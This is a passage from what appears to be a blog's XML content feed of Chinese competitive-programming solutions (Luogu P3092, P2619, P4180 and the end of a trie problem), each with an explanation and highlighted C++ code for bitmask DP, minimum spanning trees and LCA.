class="type">int</span> <span class="title">search</span><span class="params">(<span class="type">int</span> *str, <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> p = <span class="number">1</span>, cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        p = trie[p][str[i]];</span><br><span class="line">        <span class="keyword">if</span> (p == <span class="number">0</span>) <span class="keyword">return</span> cnt;</span><br><span class="line">        cnt += end[p];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cnt += <span class="built_in">getSize</span>(trie[p][<span class="number">0</span>]);</span><br><span class="line">    cnt += <span class="built_in">getSize</span>(trie[p][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> m, n;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;m, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="type">int</span> len;</span><br><span class="line">        <span class="type">static</span> <span class="type">int</span> b[MAXN];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;len);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;b[j]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">insert</span>(b, len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(size, <span class="number">-1</span>, <span class="built_in">sizeof</span>(size));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">int</span> len;</span><br><span class="line">        <span class="type">static</span> <span class="type">int</span> c[MAXN];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;len);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;c[j]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">search</span>(c, len));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>2008</tag>
        <tag>洛谷</tag>
        <tag>USACO</tag>
        <tag>Trie</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P3092」No Change - 状压 DP + 二分</title>
    <url>/luogu-3092/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P3092">洛谷链接</a></p>
<p>约翰到商场购物，他的钱包里有 <span class="math inline">\(k (1 \le k
\le 16)\)</span> 个硬币，面值的范围是 <span class="math inline">\(1 \sim
10^8\)</span>。</p>
<p>约翰想按顺序买 <span class="math inline">\(n\)</span> 个物品 <span
class="math inline">\((1 \le n \le 10^5)\)</span>，第 <span
class="math inline">\(i\)</span> 个物品需要花费 <span
class="math inline">\(c_i\)</span> 块钱，<span class="math inline">\((1
\le c_i \le 10^4)\)</span>。</p>
<p>在依次进行的购买 <span class="math inline">\(n\)</span>
个物品的过程中，约翰可以随时停下来付款，每次付款只用一个硬币，支付购买的内容是从上一次支付后开始到现在的这些所有物品（前提是该硬币足以支付这些物品的费用）。不幸的是，商场的收银机坏了，如果约翰支付的硬币面值大于所需的费用，他不会得到任何找零。</p>
<p>请计算出在购买完 <span class="math inline">\(n\)</span>
个物品后，约翰最多剩下多少钱。如果无法完成购买，输出 <span
class="math inline">\(-1\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>看到 <span class="math inline">\(k\)</span>
的取值范围很容易想到使用状压。而对于使用硬币的每种状态，剩余钱财都是固定可计算的。于是我们可以设
<span class="math inline">\(f_i\)</span> 为花费状态 <span
class="math inline">\(i\)</span>
的硬币时最多可购买的物品数。于是我们可得到下列转移方程（<span
class="math inline">\(s_i\)</span> 为购买前 <span
class="math inline">\(i\)</span> 个物品的所需花费，<span
class="math inline">\(M\)</span> 为所有硬币的集合）：</p>
<p><span class="math display">\[
f_i = \max\limits_{k \in m \wedge j = \complement_{i}\{k\}}
{\operatorname{fun}(k, f_j + 1)}
\]</span></p>
<p>其中 <span class="math inline">\(\operatorname{func}(i, j)\)</span>
表示总共有 <span class="math inline">\(i\)</span> 块钱时从第 <span
class="math inline">\(j\)</span>
个商品开始付款最多可购买到第几个商品。很显然 <span
class="math inline">\(\operatorname{func}(i, j)\)</span>
可使用二分求解。</p>
<p>最终对于所有 <span class="math inline">\(f_i = n\)</span> 所对应的
<span class="math inline">\(i\)</span>
状态，计算剩余钱的最大值即可。时间复杂度为 <span
class="math inline">\(O(k 2^k \log n)\)</span>。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXK = <span class="number">16</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">100000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> k, n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;k, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">long</span> <span class="type">long</span> money[MAXK];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>, &amp;money[i]);</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">long</span> <span class="type">long</span> s[MAXN + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>, &amp;s[i]);</span><br><span class="line">        s[i] += s[i - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> f[<span class="number">1</span> &lt;&lt; MAXK];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; (<span class="number">1</span> &lt;&lt; k); i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; k; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((i &gt;&gt; j) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">int</span> x = i ^ (<span class="number">1</span> &lt;&lt; j);</span><br><span class="line">                <span class="keyword">if</span> (f[x] == n) &#123;</span><br><span class="line">                    f[i] = n;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> l = f[x] + <span class="number">1</span>, r = n;</span><br><span class="line">                <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">                    <span class="type">int</span> mid = (l + r + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">if</span> (s[mid] - s[f[x]] &lt;= money[j]) l = mid;</span><br><span class="line">                    <span class="keyword">else</span> r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                f[i] = std::<span class="built_in">max</span>(f[i], l);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; (<span class="number">1</span> &lt;&lt; k); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (f[i] == n) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; k; j++) <span class="keyword">if</span> (!((i &gt;&gt; j) &amp; <span class="number">1</span>)) res += money[j];</span><br><span class="line">            ans = std::<span class="built_in">max</span>(ans, res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>二分</tag>
        <tag>USACO</tag>
        <tag>2013</tag>
        <tag>状压 DP</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P2619」Tree I - 二分答案 + 最小生成树</title>
    <url>/luogu-2619/</url>
    <content><![CDATA[<h1 id="题目描述">题目描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P2619">洛谷链接</a></p>
<p>给你一个无向带权连通图，每条边是黑色或白色。让你求一棵最小权的恰好有
<span class="math inline">\(need\)</span> 条白色边的生成树。</p>
<p>题目保证有解。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>显然这道题靠的是最小生成树。而要求有 <span
class="math inline">\(\text{need}\)</span>
条白色边。于是我们可以在白色边上操作。</p>
<p>我们可以将所有的白边同时加上或减去一个权值，使最小生成树的边的选择产生变化，直到选择的边中恰有
<span class="math inline">\(\text{need}\)</span> 条白色边。</p>
<p>于是我们可以二分答案白边加上或减去的权值。在利用 Kruskal
求出最小生成树的同时统计白边的数量。通过调整白边权值变化达到生成树中恰有
<span class="math inline">\(\text{need}\)</span>
条白边且权值最小即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">5e4</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXM = <span class="number">1e5</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    <span class="type">int</span> s, t, c, col;</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>&lt;(<span class="type">const</span> Edge &amp;other) <span class="type">const</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (c == other.c) <span class="keyword">return</span> col &lt; other.col;</span><br><span class="line">        <span class="keyword">return</span> c &lt; other.c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; E[MAXM];</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UFS</span> &#123;</span><br><span class="line">    <span class="type">int</span> f[MAXN];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) f[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x == f[x] ? x : f[x] = <span class="built_in">find</span>(f[x]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">        f[<span class="built_in">find</span>(x)] = <span class="built_in">find</span>(y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; ufs;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> v, e, need;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; <span class="title">kruskal</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ufs.<span class="built_in">init</span>(v);</span><br><span class="line">    std::<span class="built_in">sort</span>(E, E + e);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>, counts = <span class="number">0</span>, cntNeed = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; e; i++) &#123;</span><br><span class="line">        Edge &amp;edge = E[i];</span><br><span class="line">        <span class="keyword">if</span> (ufs.<span class="built_in">find</span>(edge.s) == ufs.<span class="built_in">find</span>(edge.t)) <span class="keyword">continue</span>;</span><br><span class="line">        ufs.<span class="built_in">merge</span>(edge.s, edge.t);</span><br><span class="line">        ans += edge.c;</span><br><span class="line">        <span class="keyword">if</span> (edge.col == <span class="number">0</span>) cntNeed++;</span><br><span class="line">        <span class="keyword">if</span> (++counts == v - <span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> std::<span class="built_in">make_pair</span>(cntNeed, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;v, &amp;e, &amp;need);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; e; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, &amp;E[i].s, &amp;E[i].t, &amp;E[i].c, &amp;E[i].col);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> l = -INF, r = INF, ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">        <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; e; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (E[i].col == <span class="number">0</span>) &#123;</span><br><span class="line">                E[i].c += mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; res = <span class="built_in">kruskal</span>();</span><br><span class="line">        res.second -= mid * need;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; e; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (E[i].col == <span class="number">0</span>) &#123;</span><br><span class="line">                E[i].c -= mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (res.first &gt;= need) l = mid + <span class="number">1</span>, ans = res.second;</span><br><span class="line">        <span class="keyword">else</span> r = mid - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>图论</tag>
        <tag>二分</tag>
        <tag>二分答案</tag>
        <tag>洛谷</tag>
        <tag>最小生成树</tag>
        <tag>国家集训队</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P4180」严格次小生成树 - 最小生成树 + 最近公共祖先</title>
    <url>/luogu-4180/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P4180">洛谷链接</a></p>
<p>小 C 最近学了很多最小生成树的算法，Prim 算法、Kruskal
算法、消圈算法等等。正当小 C 洋洋得意之时，小 P 又来泼小 C 冷水了。小 P
说，让小 C
求出一个无向图的次小生成树，而且这个次小生成树还得是严格次小的，也就是说：如果最小生成树选择的边集是
<span class="math inline">\(E_M\)</span>，严格次小生成树选择的边集是
<span class="math inline">\(E_S\)</span>，那么需要满足：(<span
class="math inline">\(value(e)\)</span> 表示边 <span
class="math inline">\(e\)</span> 的权值) <span
class="math inline">\(\sum_{e \in E_M}value(e)&lt;\sum_{e \in
E_S}value(e)\)</span></p>
<p>这下小 C 蒙了，他找到了你，希望你帮他解决这个问题。</p>
<p>对于 <span class="math inline">\(100\%\)</span> 的数据， <span
class="math inline">\(N\le 10^5\)</span>，<span
class="math inline">\(M\le 3\times10^5\)</span>，边权 <span
class="math inline">\(\in
[0,10^9]\)</span>，数据保证必定存在严格次小生成树。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>首先我们求出最小生成树。然后对于每个未选中的边按权值从小到达遍历。对于每个未选中的边，设我们找到了边
<span class="math inline">\(u \leftrightarrow
v\)</span>，我们可以在最小生成树中找到 <span class="math inline">\(u
\rightarrow v\)</span>
的路径，再将路径中的权值最大的边替换成该边。这样可以同时满足是一颗生成树且总权值相差最小。于是我们就得到了次小生成树的可能情况。最后在这些可能情况中取最小值即可。</p>
<p>但这样的次小生成树是非严格的，因为我们找到的边和将要替换的边权值可能相等。此时我们只需要用路径上的次大边替换就行了。</p>
<p>对于路径上的最大边和次大边，我们可以在预处理 LCA 的时候同时预处理 LCA
对应的路径的最大边和次大边即可。</p>
<p>整个问题的时间复杂度为 <span class="math inline">\(O(m \log
m)\)</span>。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;climits&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1e5</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXM = <span class="number">3e5</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> LOG_MAXN = <span class="number">17</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> Edge&gt; e;</span><br><span class="line">    Node *p, *f[LOG_MAXN + <span class="number">1</span>];</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> maxe[LOG_MAXN + <span class="number">1</span>][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> d, id;</span><br><span class="line">&#125; N[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    Node *s, *t;</span><br><span class="line">    <span class="type">int</span> sid, tid;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> w;</span><br><span class="line">    <span class="type">bool</span> v;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Edge</span>() &#123;&#125;</span><br><span class="line">    <span class="built_in">Edge</span>(Node *s, Node *t, <span class="type">long</span> <span class="type">long</span> w) : <span class="built_in">s</span>(s), <span class="built_in">t</span>(t), <span class="built_in">w</span>(w) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>&lt;(<span class="type">const</span> Edge &amp;other) <span class="type">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> w &lt; other.w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; E[MAXM + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UnionFindSet</span> &#123;</span><br><span class="line">    <span class="type">int</span> fa[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) fa[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x == fa[x] ? x : fa[x] = <span class="built_in">find</span>(fa[x]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">        fa[<span class="built_in">find</span>(x)] = <span class="built_in">find</span>(y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; ufs;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">addEdge</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> t, <span class="type">long</span> <span class="type">long</span> w)</span> </span>&#123;</span><br><span class="line">    N[s].e.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(&amp;N[s], &amp;N[t], w));</span><br><span class="line">    N[t].e.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(&amp;N[t], &amp;N[s], w));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">long</span> <span class="type">long</span> <span class="title">kruskal</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ufs.<span class="built_in">init</span>(n);</span><br><span class="line">    std::<span class="built_in">sort</span>(E + <span class="number">1</span>, E + m + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> counts = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        Edge &amp;e = E[i];</span><br><span class="line">        <span class="keyword">if</span> (ufs.<span class="built_in">find</span>(e.sid) == ufs.<span class="built_in">find</span>(e.tid)) <span class="keyword">continue</span>;</span><br><span class="line">        e.v = <span class="literal">true</span>;</span><br><span class="line">        <span class="built_in">addEdge</span>(e.sid, e.tid, e.w);</span><br><span class="line">        ufs.<span class="built_in">merge</span>(e.sid, e.tid);</span><br><span class="line">        ans += e.w;</span><br><span class="line">        <span class="keyword">if</span> (++counts == n - <span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prepare</span><span class="params">(Node *v, Node *f = <span class="literal">NULL</span>)</span> </span>&#123;</span><br><span class="line">    v-&gt;f[<span class="number">0</span>] = v-&gt;p = f;</span><br><span class="line">    v-&gt;d = (f ? f-&gt;d : <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">    v-&gt;maxe[<span class="number">0</span>][<span class="number">1</span>] = LLONG_MIN;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= LOG_MAXN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (v-&gt;f[i - <span class="number">1</span>]) &#123;</span><br><span class="line">            v-&gt;f[i] = v-&gt;f[i - <span class="number">1</span>]-&gt;f[i - <span class="number">1</span>];</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> choice[<span class="number">4</span>] = &#123; v-&gt;maxe[i - <span class="number">1</span>][<span class="number">0</span>], v-&gt;maxe[i - <span class="number">1</span>][<span class="number">1</span>],</span><br><span class="line">                                    v-&gt;f[i - <span class="number">1</span>]-&gt;maxe[i - <span class="number">1</span>][<span class="number">0</span>], v-&gt;f[i - <span class="number">1</span>]-&gt;maxe[i - <span class="number">1</span>][<span class="number">1</span>] &#125;;</span><br><span class="line">            std::<span class="built_in">sort</span>(choice, choice + <span class="number">4</span>);</span><br><span class="line">            v-&gt;maxe[i][<span class="number">0</span>] = choice[<span class="number">3</span>];</span><br><span class="line">            <span class="type">int</span> p = <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">while</span> (p &gt;= <span class="number">0</span> &amp;&amp; choice[p] == choice[<span class="number">3</span>]) p--;</span><br><span class="line">            v-&gt;maxe[i][<span class="number">1</span>] = (p == <span class="number">-1</span> ? LLONG_MIN : choice[p]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (Edge *e = &amp;v-&gt;e.<span class="built_in">front</span>(); e &amp;&amp; e &lt;= &amp;v-&gt;e.<span class="built_in">back</span>(); e++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e-&gt;t == f) <span class="keyword">continue</span>;</span><br><span class="line">        e-&gt;t-&gt;maxe[<span class="number">0</span>][<span class="number">0</span>] = e-&gt;w;</span><br><span class="line">        <span class="built_in">prepare</span>(e-&gt;t, v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> Node *<span class="title">lca</span><span class="params">(Node *u, Node *v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u-&gt;d &lt; v-&gt;d) std::<span class="built_in">swap</span>(u, v);</span><br><span class="line">    <span class="keyword">if</span> (u-&gt;d != v-&gt;d) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = LOG_MAXN; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (u-&gt;f[i] &amp;&amp; u-&gt;f[i]-&gt;d &gt;= v-&gt;d) &#123;</span><br><span class="line">                u = u-&gt;f[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (u != v) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = LOG_MAXN; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (u-&gt;f[i] != v-&gt;f[i]) &#123;</span><br><span class="line">                u = u-&gt;f[i];</span><br><span class="line">                v = v-&gt;f[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> u-&gt;p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">long</span> <span class="type">long</span> <span class="title">query</span><span class="params">(Node *v, Node *f, <span class="type">long</span> <span class="type">long</span> w)</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> res = LLONG_MIN;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = LOG_MAXN; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (v-&gt;f[i] &amp;&amp; v-&gt;f[i]-&gt;d &gt;= f-&gt;d) &#123;</span><br><span class="line">            <span class="keyword">if</span> (w != v-&gt;maxe[i][<span class="number">0</span>]) res = std::<span class="built_in">max</span>(res, v-&gt;maxe[i][<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">else</span> res = std::<span class="built_in">max</span>(res, v-&gt;maxe[i][<span class="number">1</span>]);</span><br><span class="line">            v = v-&gt;f[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= 